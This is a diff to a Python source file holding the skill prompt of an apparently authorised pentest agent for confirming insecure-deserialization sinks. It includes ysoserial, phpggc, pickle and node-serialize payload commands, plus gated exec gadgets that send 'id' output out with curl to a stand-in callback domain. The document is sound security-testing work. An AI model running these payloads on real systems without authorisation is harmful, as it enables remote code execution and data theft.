@@ -1,10 +1,17 @@
 """Built-in insecure-deserialization skill.
 
-DESERIALIZATION_TOOLS is .format()-templated (use {{ }} for literal braces);
-sub-sections are appended raw. Black-box only. The workflow body is adapted from
-community-skills/insecure_deserialization.md (per-language tracks, non-destructive
-out-of-band oracle, gated gadget execution); the one new behaviour here is the
-graph-candidate handshake with the recon serialized_scan source. No em dashes.
+Self-contained: every payload, command and gadget the agent needs is inlined
+here, grounded in the tools that actually ship in the kali-sandbox image
+(ysoserial, phpggc + php-cli, interactsh-client, python3, nodejs). There is NO
+reference to any external document, because community skills are only loaded for
+a user_skill:* run and are NOT in context during a built-in deserialization run.
+
+DESERIALIZATION_TOOLS is .format()-templated: the ONLY real placeholders are
+{deser_exec_gadgets_enabled} and {deser_oob_provider}; every other brace is a
+literal and is escaped {{ }}. DESERIALIZATION_OOB_WORKFLOW and
+DESERIALIZATION_PAYLOAD_REFERENCE are appended RAW (no .format). The literal
+string "interactsh-client" appears ONLY in the OOB workflow, so disabling the OOB
+callback removes it from the prompt. Black-box only. No em dashes.
 """
 
 # =============================================================================
@@ -13,135 +20,376 @@ graph-candidate handshake with the recon serialized_scan source. No em dashes.
 DESERIALIZATION_TOOLS = """
 ## ATTACK SKILL: INSECURE DESERIALIZATION
 
-You confirm insecure-deserialization candidates that recon already flagged, and
-find new ones where recon could not see. Recon is passive and never
-deserializes; you prove the sink reaches a language deserializer using a
-NON-DESTRUCTIVE out-of-band oracle first, and only escalate to a code-execution
-gadget when it is explicitly enabled. Black-box only: never assume target
-internals.
+An insecure-deserialization sink flows attacker-controlled bytes into a
+language-level deserializer that reconstructs an object graph (Java
+ObjectInputStream, PHP unserialize, Python pickle, Node node-serialize, and
+polymorphic JSON/XML/YAML). You have two jobs, and you do whichever the state in
+front of you calls for:
 
-### Step 1 - Reuse recon FIRST (query_graph, deterministic read)
+- CONFIRM: take the candidates recon already flagged and prove the sink really
+  deserializes attacker bytes.
+- FIND: when recon flagged nothing (the scan never ran, or it ran and the sink
+  was off-HTTP, encrypted or request-body-only), discover sinks yourself and
+  prove them.
+
+Rules that never change:
+- Confirmation is a NON-DESTRUCTIVE out-of-band oracle. You prove the bytes reach
+  a deserializer with a callback that runs no gadget and changes nothing. The
+  report is built on this, never on a code-execution chain.
+- A code-execution gadget runs ONLY when the operator enabled it (Step 7). When
+  it is off you stop at the oracle.
+- Black-box: never assume target internals. Fingerprint, do not guess.
+
+### Sandbox reality (what you can and cannot finish here)
+Build your plan around the tools that exist in this environment:
+- Java: `ysoserial` (full gadget set incl. URLDNS) is installed. End to end.
+- PHP: `phpggc` and `php` (php-cli) are installed. End to end, including PHAR.
+- Python: `python3` is installed; craft pickle oracles directly. End to end.
+- Node: `node`/`npm` are installed; craft node-serialize oracles directly.
+- Ruby: `ruby` is installed. Forge a Marshal gadget directly (the universal Ruby
+  deserialization gadget is pure-Ruby, no gem needed); this also covers Rails
+  `secret_key_base` session cookies. End to end.
+- .NET ViewState: `viewgen` is installed, so a signed/encrypted `__VIEWSTATE` is
+  end to end WHEN you have the machineKey (leaked / default / from a `web.config`).
+  A non-ViewState BinaryFormatter blob is still DETECTION-only (no ysoserial.net),
+  and a ViewState whose machineKey you do NOT have is a cryptographic problem (see
+  Dead ends), not a deserializer you can reach.
+- JNDI (SnakeYAML/Jackson/FastJSON typed payloads): you can make the target FETCH
+  a URL you control and confirm that over OAST, but there is no rogue LDAP/RMI
+  server in this sandbox, so JNDI-to-RCE is out of reach. Confirmation stops at
+  the fetch.
+There is no classpath-enumeration tool (no GadgetProbe) here, so select a Java
+chain from the framework fingerprint (recon tech, Server/X-Powered-By headers,
+cookie names like JSESSIONID / rememberMe) plus URLDNS confirmation, then try the
+likely chains and read the response.
+
+================================================================================
+## PART A - CONFIRM recon candidates (do this first when the scan ran)
+================================================================================
+
+### A1 - Pull pending candidates (query_graph, deterministic read)
 The serialized_scan recon module writes :Vulnerability candidates with
 source="serialized_scan", needs_agent_confirmation=true and severity="info".
-Pull the pending ones and CAPTURE each candidate's id plus its deser_* metadata.
-query_graph imposes no server-side LIMIT, so make the read deterministic: ORDER
-BY v.id with an explicit LIMIT, and page with v.id > $last_id when a count shows
-more. Never issue a bare unordered query.
+Recon flags presence and reachability only: it is passive and never
+deserializes, so each candidate is an UNPROVEN lead (that is why it sits at
+severity "info" needing confirmation) until you prove the sink actually parses
+your bytes. Proving it is your whole job here.
+Capture each candidate's id AND all of its deser_* metadata, including
+deser_encoding_layers (the exact decode stack recon peeled off: you MUST re-apply
+it in reverse to your oracle) and evidence_snippet (the bytes recon saw).
+query_graph imposes no server-side LIMIT, so order and page it; never issue a
+bare unordered read.
 ```
-query_graph({{"query": "MATCH (e)-[:HAS_VULNERABILITY]->(v:Vulnerability {{source:'serialized_scan'}}) WHERE v.needs_agent_confirmation = true AND NOT (:ChainFinding)-[:CONFIRMS]->(v) RETURN v.id AS id, v.deser_format AS fmt, v.deser_language AS lang, v.deser_transport AS transport, v.deser_location AS location, v.deser_magic AS magic, v.matched_at AS url ORDER BY v.id LIMIT 200"}})
+query_graph({{"query": "MATCH (v:Vulnerability {{source:'serialized_scan'}}) WHERE v.needs_agent_confirmation = true AND NOT (:ChainFinding)-[:CONFIRMS]->(v) OPTIONAL MATCH (e:Endpoint)-[:HAS_VULNERABILITY]->(v) RETURN v.id AS id, v.deser_format AS fmt, v.deser_language AS lang, v.deser_transport AS transport, v.deser_location AS location, v.deser_magic AS magic, v.deser_encoding_layers AS layers, v.evidence_snippet AS snippet, v.matched_at AS url, e.method AS method ORDER BY v.id LIMIT 200"}})
 ```
-Use graph_summary to tell "unscanned" (no candidates because the scan never ran)
-from "clean" (it ran and found nothing).
+Page with an added `AND v.id > '<last_id>'` when a count shows more than 200. Use
+graph_summary to tell "unscanned" (no candidates because the scan never ran, go
+to PART B) from "clean" (it ran and found nothing, PART B widens the search).
 
-### Step 2 - Fetch the original request (traffic_tools), do not re-crawl
+Note on the locators: the HTTP method is NOT a property of the candidate node; it
+lives on the linked Endpoint, which is why the query reads `e.method`. If a
+candidate is attached only to a BaseURL, method comes back null, so recover it
+from the captured request in A2.
+
+### A2 - Recover the exact original request (traffic tools, do not re-crawl)
 For a candidate, pull the real request with your traffic tools: search captured
-transactions by endpoint + method, or fetch_transaction when a transaction id is
-known. The candidate carries enough locator (url, http_method, deser_transport,
-deser_location) to find it. If there are no candidates, probe from scratch:
-fingerprint cookies, headers and body fields for the signatures below.
+transactions by the candidate's `url` + `method`, or fetch_transaction when a
+transaction id is known. Read off three things you must reproduce exactly:
+- deser_transport + deser_location: WHERE the blob rides (a named cookie, a named
+  parameter, a named header, or a position in the request body).
+- layers (deser_encoding_layers): the encode stack, e.g. ["url","base64","gzip"].
+  Your oracle bytes must be wrapped in the SAME layers, innermost-first, or the
+  sink never sees a valid object and you get a false negative.
+- the surrounding request (other params, auth cookies, CSRF token) so your
+  modified request is otherwise valid.
 
-### Step 3 - Non-destructive out-of-band oracle (DEFAULT, no code run)
-Prove the bytes reach a deserializer without running a gadget. A Java URLDNS blob
-(only java.net.URL + HashMap), a Python pickle whose __reduce__ triggers a DNS
-lookup, or an equivalent per language, each point at your OOB domain
-({deser_oob_provider}); a DNS or HTTP hit confirms deserialization with zero
-impact on the target. Prefer DNS over HTTP. This is the confirmation; the report
-is built on this, never on a code-execution chain.
+================================================================================
+## PART B - FIND new sinks (no candidates, or to go wider than recon)
+================================================================================
 
-### Step 4 - Per-language track (adapted from the community skill)
-Select by deser_language / deser_format:
-- Java (native_java, jackson_json, fastjson, xmldecoder, xstream, snakeyaml,
-  hessian): ysoserial URLDNS oracle; CommonsCollections / Spring / Hibernate
-  chains by classpath; Shiro rememberMe cookie track; JNDI referral; Jackson
-  @class / FastJSON @type polymorphic JSON.
-- PHP (php_serialize, phar): phpggc Monolog oracle; PHAR polyglot via an upload
-  the sink reaches through phar://.
-- Python (python_pickle): __reduce__ pickle oracle; yaml.unsafe_load track.
-- .NET (dotnet_binaryformatter, viewstate): ViewState without MAC; JSON.NET
-  TypeNameHandling $type.
-- Ruby (ruby_marshal): Marshal / Psych.load with a leaked secret_key_base.
-The detailed per-language payloads live in the shipped insecure_deserialization
-community skill; follow it for the exact gadget syntax.
+### B1 - Sweep every input that could carry a serialized blob
+Recon sees the response side and enumerated params; request bodies and many
+cookies it never had. Walk EVERY attacker-controlled input and look for a blob:
+session and auth cookies, hidden form fields, `__VIEWSTATE` / `__EVENTVALIDATION`,
+custom headers, query and POST parameters, path segments, JSON/XML request
+bodies, file-upload contents and filenames, message-queue or websocket frames,
+and any "state"/"token"/"data"/"payload" field. Pull real requests with your
+traffic tools rather than re-crawling.
 
-### Step 5 - Report the confirmation (BOTH fields are mandatory)
-On a confirmed candidate, report with action="report_finding" (or the finding
-tool for this run) carrying BOTH:
+### B2 - Recognise the format
+Decode layered values (URL -> base64 -> gzip/zlib -> hex, re-checking at each
+layer) and match the magic bytes and text markers in the PAYLOAD REFERENCE below.
+That tells you the language and serializer, which decides the oracle.
+
+### B3 - Prove you control it, and read the error channel
+Tamper the blob minimally and resend:
+- Flip one byte / truncate the trailing bytes. A deserializer that is actually
+  parsing your bytes answers differently from one that ignores them: a 500, a
+  stack trace naming readObject / unserialize() / pickle / ObjectInputStream, a
+  distinct error string, a hang, or a changed response. That differential is
+  error-based detection and is itself strong evidence the sink deserializes
+  untrusted input. A blob that can be corrupted with no change at all is probably
+  not deserialized server-side; deprioritise it.
+
+================================================================================
+## CONFIRM THE SINK - three channels, in this order
+================================================================================
+1. OUT-OF-BAND ORACLE (primary, when the OOB callback is enabled): a payload that
+   forces a DNS/HTTP callback to a domain you registered. A hit is proof. This is
+   the only channel that confirms blind sinks positively.
+2. TIMING (fallback when egress is filtered): point the oracle at an unroutable or
+   firewalled host and compare response time against a fast/local target. A
+   consistent hang on the external target, fast on the local one, indicates the
+   server tried to connect while deserializing.
+3. ERROR / EXCEPTION (fallback, always available): the B3 differential. A
+   deserialization-specific exception on malformed bytes confirms the parser runs
+   on your input even when no callback and no timing signal is available.
+
+If no callback arrives AND there is no timing or error differential, the result
+is INCONCLUSIVE (egress may be filtered), NOT "safe". Say inconclusive; never
+report a negative as a clean bill.
+
+### Build the oracle per language (re-wrap in the candidate's encoding layers)
+Register your OOB domain first (see the OOB oracle section) and call it
+REGISTERED_DOMAIN below. The OOB provider for this project is
+{deser_oob_provider}. After you generate raw oracle bytes, re-apply the
+candidate's `layers` in reverse (e.g. gzip, then base64, then URL-encode) before
+placing them in the exact transport/location from A2 or B1.
+
+- JAVA (native_java, and the transport behind Shiro rememberMe / JSF ViewState):
+  URLDNS is classpath-independent, so it confirms ObjectInputStream reachability
+  even when you do not yet know the gadget libraries.
+  ```
+  kali_shell({{"command": "ysoserial URLDNS http://REGISTERED_DOMAIN > /tmp/o.bin && base64 -w0 /tmp/o.bin"}})
+  ```
+  Deliver the base64 (re-wrapped per `layers`) in the cookie/param/body. A DNS hit
+  confirms. Only after that, and only if Step 7 is enabled, move to an exec chain.
+
+- JAVA polymorphic JSON/XML/YAML (jackson_json @class, fastjson @type, xstream,
+  xmldecoder, snakeyaml): these are TEXT. Hand-craft a typed payload whose type
+  forces the parser to open a URL to REGISTERED_DOMAIN (e.g. a data-source / URL /
+  JdbcRowSet style type for Jackson/FastJSON, a ScriptEngine URLClassLoader tag
+  for SnakeYAML, a java.net.URL element for XMLDecoder/XStream). A fetch to your
+  domain confirms the sink instantiates attacker-named types. JNDI-to-RCE needs an
+  LDAP/RMI server not present here, so stop at the confirmed fetch.
+
+- PYTHON (python_pickle, yaml.unsafe_load): craft a pickle whose __reduce__ asks
+  the interpreter to RESOLVE your domain (DNS only, non-destructive), then base64
+  it.
+  ```
+  kali_shell({{"command": "python3 -c \\"import pickle,base64,socket\\nclass P:\\n def __reduce__(self):\\n  return (socket.gethostbyname,('REGISTERED_DOMAIN',))\\nprint(base64.b64encode(pickle.dumps(P())).decode())\\""}})
+  ```
+  For a YAML sink, the text form is `!!python/object/apply:socket.gethostbyname ['REGISTERED_DOMAIN']`.
+  A DNS hit confirms. os.system/exec stays for Step 7.
+
+- PHP (php_serialize, phar): first prove object injection with php-cli (serialize a
+  small object and confirm a wakeup/destruct side effect or an unserialize error
+  differential), then use phpggc for a framework chain.
+  ```
+  kali_shell({{"command": "phpggc -l | head -40"}})          # list chains available
+  kali_shell({{"command": "phpggc Monolog/RCE1 system id"}}) # example chain (Step 7 only)
+  ```
+  PHAR: `phar://` triggers on ANY filesystem function that reaches your archive
+  (file_exists, fopen, getimagesize, is_file), not only on an upload field. Build
+  a polyglot and point a filesystem sink at it:
+  ```
+  kali_shell({{"command": "phpggc -p phar -pj /tmp/poly.jpg -o /tmp/x.phar Monolog/RCE1 system id"}})
+  ```
+  A pure non-destructive PHP oracle is usually the B3 error differential plus a
+  gadget whose benign step performs an outbound fetch; lead with error-based when
+  no benign-callback chain fits.
+
+- NODE (node-serialize and similar): the sink evaluates an IIFE tagged
+  `_$$ND_FUNC$$_`. A non-destructive oracle only resolves your domain:
+  ```
+  {{"rce":"_$$ND_FUNC$$_function(){{require('dns').lookup('REGISTERED_DOMAIN',function(){{}});}}()"}}
+  ```
+  Deliver it in the JSON field the sink unserializes. A DNS hit confirms.
+
+- RUBY (ruby_marshal): `ruby` is installed. Non-destructive confirm: lead with the
+  B3 error channel on the `\\x04\\x08` marker. Rails: if you recovered
+  `secret_key_base`, forge a session cookie by Marshal-dumping a session Hash and
+  HMAC-signing it (works on any Ruby). Exec (gated): build a version-appropriate
+  universal Ruby gadget object-graph; do NOT Marshal.dump an ERB object (modern
+  Ruby refuses it, "singleton class can't be dumped").
+- .NET ViewState (viewstate): decode `__VIEWSTATE` with `viewgen --decode`. If it
+  is unprotected, or you have the machineKey (leaked / default / from a leaked
+  `web.config`), forge an exec payload with `viewgen --webconfig web.config -c
+  <cmd>` (gated). A MAC'd/encrypted ViewState with an UNKNOWN key is a crypto
+  pivot (see Dead ends).
+- .NET BinaryFormatter (dotnet_binaryformatter, non-ViewState): DETECTION only
+  here (no ysoserial.net); report the confirmed sink and name the ceiling.
+
+### Prioritise when there are many candidates
+Confirm in this order: (1) blobs on AUTH surfaces (session/rememberMe cookies,
+ViewState) - highest impact; (2) native binary formats (Java, pickle, .NET,
+Marshal) over text typing - usually a more direct sink; (3) a format whose runtime
+you can finish in this sandbox (Java, PHP, Python, Node, Ruby, and .NET ViewState
+once you have the machineKey) before one that stays detection-only here
+(non-ViewState .NET BinaryFormatter). One oracle delivery at a time; do not fan
+out gadget chains under load.
+
+================================================================================
+## Step 5 - Report the confirmation (fields are mandatory)
+================================================================================
+Report with action="report_finding" (or the finding tool for this run):
 - finding_type="vulnerability_confirmed"  (NOT the default "custom": only a
-  proof-typed finding promotes the candidate to T1; "custom" lands the edge but
+  proof-typed finding promotes a candidate to T1; "custom" lands the edge but
   never promotes).
-- related_finding_ids=[<the EXACT candidate id captured in Step 1>]  (this is
-  what makes the orchestration MERGE (:ChainFinding)-[:CONFIRMS]->(candidate)).
-Put the oracle proof (the OAST hit line, timestamped within the same minute as
-the request, and the issued domain) in the finding evidence.
+- When you confirmed a RECON candidate from PART A:
+  related_finding_ids=[<the EXACT candidate id captured in A1>]  (this is what
+  makes the orchestration MERGE (:ChainFinding)-[:CONFIRMS]->(candidate) and
+  promote it). Mistyped or cross-tenant ids match nothing silently.
+- When you FOUND a NEW sink in PART B that recon never flagged: there is no
+  candidate id to link, so omit related_finding_ids (or leave it empty) and
+  report it as a standalone confirmed finding.
+Put the oracle proof in the evidence: the OAST hit line timestamped within the
+same minute as your delivery, the REGISTERED_DOMAIN you issued, the transport and
+location, and the format. For a timing or error-based confirmation, include the
+two compared responses or the deserialization exception.
 
-### Step 6 - VERIFY the handshake landed
-The CONFIRMS writer is tenant-scoped and label-restricted and silently matches
-nothing on a wrong, mistyped or cross-tenant id. After reporting, re-query the
-candidate and confirm an incoming CONFIRMS edge now exists:
+================================================================================
+## Step 6 - VERIFY the handshake landed (only when you linked a candidate)
+================================================================================
+The CONFIRMS writer is tenant-scoped and label-restricted and matches nothing
+silently on a wrong, mistyped or cross-tenant id. After reporting a PART A
+confirmation, re-query the candidate and verify an incoming CONFIRMS edge now
+exists:
 ```
 query_graph({{"query": "MATCH (cf:ChainFinding)-[:CONFIRMS]->(v:Vulnerability {{id:'<CANDIDATE_ID>'}}) RETURN cf.finding_type, v.id"}})
 ```
 If it is absent, re-report with the exact captured id. Never assume success.
 
-### Step 7 - Escalate to an exec gadget (GATED: {deser_exec_gadgets_enabled})
-Code-execution gadget delivery runs ONLY when the operator has enabled it. When
-{deser_exec_gadgets_enabled} is false, stop at the non-destructive oracle and
-report the confirmation. When true, follow the per-language exec track from the
-community skill, confirm authorisation, start with the oracle, and deliver a
-single command that exfils a minimal fingerprint (id; hostname) over OAST.
+================================================================================
+## Dead ends and pivots (do not loop)
+================================================================================
+- Encrypted or MAC-protected blob (ViewState with MAC, a Shiro rememberMe cookie
+  whose AES key you do not have, any signed/encrypted token): the barrier is
+  CRYPTOGRAPHIC, not a deserializer you can reach. Do not brute it here;
+  switch_skill to crypto_attack to attack the key/MAC, and come back if it falls.
+- Confirmed sink you cannot finish in this sandbox (Ruby, .NET, JNDI-to-RCE):
+  report the confirmed deserialization with its ceiling named. A confirmed sink
+  is a real finding even without the exec step.
+- No signal on any of the three channels: report INCONCLUSIVE with what you tried,
+  not a clean result.
 
 ### When to transition phases    # action="request_phase_transition"
-Confirm a candidate in the informational phase with the OOB oracle. Request a
-phase transition only when an exec gadget is enabled and a sink is confirmed.
+Confirm candidates in the informational phase with the OOB oracle. Request a phase
+transition only when an exec gadget is enabled AND a sink is confirmed.
+
+================================================================================
+## Step 7 - Escalate to an exec gadget (GATED: {deser_exec_gadgets_enabled})
+================================================================================
+Code-execution gadget delivery runs ONLY when the operator enabled it. When
+{deser_exec_gadgets_enabled} is false, stop at the non-destructive oracle and
+report the confirmation. When true: confirm authorisation, keep the oracle result
+as your proof-of-reachability, then deliver ONE gadget that exfils a minimal
+fingerprint (id; hostname) over OAST rather than a shell:
+- Java: `ysoserial CommonsCollections6 'curl REGISTERED_DOMAIN/$(id|tr " " _)'`
+  (pick the chain matching the fingerprint: CommonsCollections1-7,
+  CommonsBeanutils1, Spring1/2, Hibernate1/2, Groovy1, ROME, C3P0).
+- PHP: the phpggc chain from above with `curl`/`id` as the command.
+- Python: a pickle __reduce__ returning (os.system, ('curl REGISTERED_DOMAIN...',)).
+- Node: the `_$$ND_FUNC$$_` IIFE calling child_process.exec of the same curl.
+One command, minimal fingerprint, over OAST. No destructive actions.
 
 ### Reporting guidelines
-For each confirmed sink: the endpoint/parameter/cookie and byte-stream format,
-the runtime and framework version, the gadget or oracle used, the OAST proof
-line, and a remediation pointer (disable polymorphic typing; replace
-BinaryFormatter / pickle / unserialize / Marshal.load with format-bound parsers;
-HMAC the byte-stream; restrict allowed classes).
+For each confirmed sink report: the endpoint/parameter/cookie and the byte-stream
+format, the runtime and framework fingerprint, the oracle or gadget used, the OAST
+or timing/error proof, the encoding layers you reproduced, and a remediation
+pointer (disable polymorphic typing; replace BinaryFormatter / pickle /
+unserialize / Marshal.load / node-serialize with format-bound parsers; HMAC and
+encrypt any state the client holds; allow-list classes on the deserializer).
 """
 
 # =============================================================================
 # OUT-OF-BAND ORACLE SETUP (appended when the OOB callback is enabled)
+# The ONLY place the literal "interactsh-client" appears.
 # =============================================================================
 DESERIALIZATION_OOB_WORKFLOW = """
-## Non-destructive out-of-band oracle
+## Non-destructive out-of-band oracle (setup)
 
-Stand up an interactsh listener so a blind deserialization lands somewhere
-observable, then mint a per-language oracle blob that only performs a DNS/HTTP
-callback (no code execution):
+Register a callback domain, then point every language oracle at it. The client
+ties the issued domain to itself, so you must READ the domain it prints; a random
+subdomain will not route back.
+
+### Step 1: start the listener as a background process
 ```
-kali_shell({"command": "interactsh-client -v -o /tmp/oast.log & echo started"})
+kali_shell({"command": "interactsh-client -server oast.fun -json -v > /tmp/oast.log 2>&1 & echo $!"})
 ```
-Capture the issued domain and use it in the URLDNS (Java), __reduce__-DNS
-(Python), or equivalent oracle. A hit on the issued domain, timestamped within
-the same minute as the delivery, is the confirmation that the sink deserializes
-attacker-controlled bytes. Prefer DNS callbacks; they leak less and traverse
-egress filters more often. One oracle delivery per minute is plenty; do not run
-gadget chains under load.
+Pass a different host to `-server` if the project configured another OOB provider
+or a self-hosted interactsh.
+
+### Step 2: read the issued domain (this is REGISTERED_DOMAIN)
+```
+kali_shell({"command": "sleep 5 && grep -m1 -oE '[a-z0-9]+\\\\.oast\\\\.[a-z.]+' /tmp/oast.log"})
+```
+
+### Step 3: deliver ONE oracle, then poll for the hit
+```
+kali_shell({"command": "tail -50 /tmp/oast.log"})
+```
+A DNS or HTTP line for your issued domain, timestamped within the same minute as
+the delivery, is the confirmation that the sink deserialized attacker-controlled
+bytes with zero impact on the target. Prefer DNS; it leaks less and traverses
+egress filters more often. Against an egress-restricted target no callback
+arrives: treat that as INCONCLUSIVE and fall back to the timing and error
+channels, not as proof the sink is safe. One oracle delivery per minute is plenty;
+do not run gadget chains under load.
 """
 
 # =============================================================================
-# PER-LANGUAGE PAYLOAD REFERENCE (lifted from the community skill; appended raw)
+# PER-LANGUAGE / FORMAT REFERENCE (appended raw; self-contained; NO "interactsh-client")
 # =============================================================================
 DESERIALIZATION_PAYLOAD_REFERENCE = """
-## Payload reference (follow the community insecure_deserialization skill for exact syntax)
+## Format-recognition reference (self-contained)
 
-Magic prefixes to recognise a blob before decoding: Java ObjectInputStream
-`AC ED 00 05` (base64 `rO0AB`), .NET BinaryFormatter `00 01 00 00 00 FF FF FF FF`
-(base64 `AAEAAAD/////`), Python pickle proto 2+ `80 02`/`80 04` (base64 `gAJ`/
-`gASV`), Ruby Marshal `04 08`, PHP serialized `O:<n>:` / `a:<n>:`.
+Decode layered values first (URL, base64, gzip/zlib, hex), re-checking at each
+layer, then match:
 
-Oracle-first, gadget-second, per language:
-- Java: ysoserial URLDNS (oracle) then CommonsCollections6 / Spring / Hibernate
-  (exec, gated); Shiro rememberMe AES-CBC cookie; JNDI/LDAP referral; Jackson
-  @class / FastJSON @type JSON variants.
-- PHP: phpggc Monolog/RCE (oracle via a benign callback) then framework chain;
-  PHAR polyglot through an upload reached by phar://.
-- Python: pickle __reduce__ DNS oracle then os.system exec (gated);
-  yaml.unsafe_load `!!python/object/apply`.
-- .NET: LosFormatter TextFormattingRunProperties ViewState (no MAC); JSON.NET
-  `$type` ObjectDataProvider.
-- Ruby: Psych.load / Marshal with a leaked secret_key_base.
+| Format | Magic / marker (raw, then common base64 head) | Language |
+| --- | --- | --- |
+| Java ObjectInputStream | `AC ED 00 05`  ->  base64 `rO0AB` | Java |
+| Java hex-encoded | `aced0005` | Java |
+| Jackson / json-io / Genson | JSON key `@class` | Java |
+| FastJSON | JSON key `@type` | Java |
+| XMLDecoder | `<java version=`, `<object class=`, `<void` | Java |
+| XStream | FQ-class element or `class=` attribute | Java |
+| SnakeYAML | `!!` plus a Java package tag | Java |
+| Hessian | `Content-Type: application/x-hessian` | Java |
+| .NET BinaryFormatter | `00 01 00 00 00 FF FF FF FF`  ->  base64 `AAEAAAD/////` | .NET |
+| ASP.NET ViewState | `__VIEWSTATE=` param, base64 body | .NET |
+| Python pickle (proto 2+) | `80 02` / `80 04` / `80 05`  ->  base64 `gAJ` / `gASV` | Python |
+| PyYAML unsafe | `!!python/object` | Python |
+| Ruby Marshal | `04 08` | Ruby |
+| Node node-serialize | JSON containing `_$$ND_FUNC$$_` | Node |
+| PHP serialize | `O:<n>:"..."` (object), `a:<n>:{` (array) | PHP |
+| PHP PHAR | `phar://`, or a file whose tail holds a serialized `__HALT_COMPILER` metadata block | PHP |
+
+## Confirmation-first ladder (what each format can reach in THIS sandbox)
+
+- Java native: ysoserial URLDNS confirms (classpath-independent) -> exec chain
+  (CommonsCollections/Spring/Hibernate/Groovy/ROME/C3P0) gated. END TO END.
+- Java typed JSON/XML/YAML: hand-crafted type forces an outbound fetch (confirm)
+  -> JNDI-to-RCE needs an external LDAP/RMI server NOT present (ceiling at fetch).
+- PHP: php-cli object-injection + error differential (confirm) -> phpggc chain and
+  PHAR polyglot (gated). END TO END.
+- Python pickle / unsafe YAML: __reduce__ DNS resolve (confirm) -> os.system (gated).
+  END TO END.
+- Node node-serialize: `_$$ND_FUNC$$_` DNS lookup (confirm) -> child_process (gated).
+  END TO END.
+- Ruby Marshal: forge with `ruby` (universal pure-Ruby gadget); Rails
+  secret_key_base cookies included. End to end.
+- .NET ViewState: `viewgen` decode + forge once you have the machineKey
+  (leaked / default / web.config). End to end with the key; a MAC'd/encrypted
+  ViewState with an unknown key is a crypto_attack pivot. Non-ViewState
+  BinaryFormatter: detection only (no ysoserial.net).
+
+## Transport notes
+- Cookies: whole-value base64 blobs (JSESSIONID variants, `rememberMe` for Shiro,
+  ASP.NET auth/state cookies). Re-wrap exactly as the original (often base64 only).
+- Params / body: `__VIEWSTATE`, `state=`, `data=`, `token=`, JSON/XML body fields.
+- Headers: custom `X-*` serialized state; CRLF-split when reading a raw header line.
+- Always reproduce deser_encoding_layers in reverse order on your oracle bytes, or
+  the sink rejects them before deserializing and you get a false negative.
 """
